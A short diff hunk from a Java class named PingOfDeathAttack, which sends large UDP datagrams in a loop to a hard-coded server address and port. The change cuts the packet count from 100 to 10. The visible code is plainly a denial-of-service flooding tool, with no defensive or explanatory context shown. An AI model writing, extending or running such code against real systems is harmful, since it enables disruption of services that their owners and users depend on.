@@ -14,7 +14,7 @@ public class PingOfDeathAttack {
             InetAddress address = InetAddress.getByName(SERVER_IP);
             DatagramSocket socket = new DatagramSocket();
 
-            for (int i = 0; i < 100; i++) { // Send 100 large packets
+            for (int i = 0; i < 10; i++) { // Send 10 large packets
                 DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, SERVER_PORT);
                 socket.send(packet);
                 System.out.println("Ping of Death Attack packet sent: " + i);
